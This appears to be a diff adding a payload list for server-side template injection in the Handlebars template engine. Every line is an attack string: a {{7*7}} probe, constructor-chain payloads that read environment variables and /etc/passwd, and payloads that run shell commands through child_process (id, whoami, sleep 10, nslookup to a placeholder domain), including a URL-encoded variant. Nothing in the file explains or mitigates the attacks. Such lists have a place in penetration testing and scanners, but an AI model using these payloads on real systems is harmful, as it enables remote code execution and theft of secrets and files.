@@ -1,0 +1,76 @@
+{{7*7}}
+{{#with "constructor" as |c|}}{{c.prototype}}{{/with}}
+{{#with "constructor" as |c|}}{{c.constructor("return process")().env}}{{/with}}
+{{#with "constructor" as |c|}}{{c.constructor("return process")().mainModule.require("child_process").execSync("id").toString()}}{{/with}}
+{{#with "constructor" as |c|}}{{c.constructor("return require('fs').readFileSync('/etc/passwd','utf8')")()}}{{/with}}
+{{#with constructor}}
+  {{#with (lookup this "prototype")}}
+    {{#with (lookup this "constructor")}}
+      {{#with (lookup this "mainModule")}}
+        {{#with (lookup this "require")}}
+          {{this "child_process"}}
+        {{/with}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0D%0A%20%20%7B%7B%23with%20%22e%22%7D%7D%0D%0A%20%20%20%20%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epush%20%28lookup%20string%2Esub%20%22constructor%22%29%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%23with%20string%2Esplit%20as%20%7Ccodelist%7C%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epush%20%22return%20require%28%27child%5Fprocess%27%29%2Eexec%28%27whoami%27%29%3B%22%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%23each%20conslist%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%23with%20%28string%2Esub%2Eapply%200%20codelist%29%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%2Feach%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%7B%7B%2Fwith%7D%7D%0D%0A%7B%7B%2Fwith%7D%7D
+wrtz{{#with "s" as |string|}}
+    {{#with "e"}}
+        {{#with split as |conslist|}}
+            {{this.pop}}
+            {{this.push (lookup string.sub "constructor")}}
+            {{this.pop}}
+            {{#with string.split as |codelist|}}
+                {{this.pop}}
+                {{this.push "return require('child_process').exec('nslookup {domain}');"}}
+                {{this.pop}}
+                {{#each conslist}}
+                    {{#with (string.sub.apply 0 codelist)}}
+                        {{this}}
+                    {{/with}}
+                {{/each}}
+            {{/with}}
+        {{/with}}
+    {{/with}}
+{{/with}}
+
+bdsf{{#with "s" as |string|}}
+    {{#with "e"}}
+        {{#with split as |conslist|}}
+            {{this.pop}}
+            {{this.push (lookup string.sub "constructor")}}
+            {{this.pop}}
+            {{#with string.split as |codelist|}}
+                {{this.pop}}
+                {{this.push "return require('child_process').exec('sleep 10');"}}
+                {{this.pop}}
+                {{#each conslist}}
+                    {{#with (string.sub.apply 0 codelist)}}
+                        {{this}}
+                    {{/with}}
+                {{/each}}
+            {{/with}}
+        {{/with}}
+    {{/with}}
+{{/with}}
+
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').exec('whoami');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
